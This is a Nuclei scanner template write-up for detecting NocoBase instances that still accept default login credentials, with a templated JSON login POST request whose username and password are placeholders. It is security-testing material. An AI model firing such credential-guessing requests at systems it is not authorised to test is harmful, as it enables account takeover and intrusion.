# Nuclei Template: NocoBase - Default Login
**Template ID:** nocobase-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`nocobase-default-login.yaml`)

## Vulnerability Information & PoC

## Description
NocoBase default login was discovered.

## Steps to reproduce / Exploit Payload
```http
POST {{path}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"account": "{{username}}", "password": "{{password}}"}
```

## References
- https://www.nocobase.com/
- https://github.com/nocobase/nocobase
- https://docs.nocobase.com/welcome/getting-started/installation/docker-compose
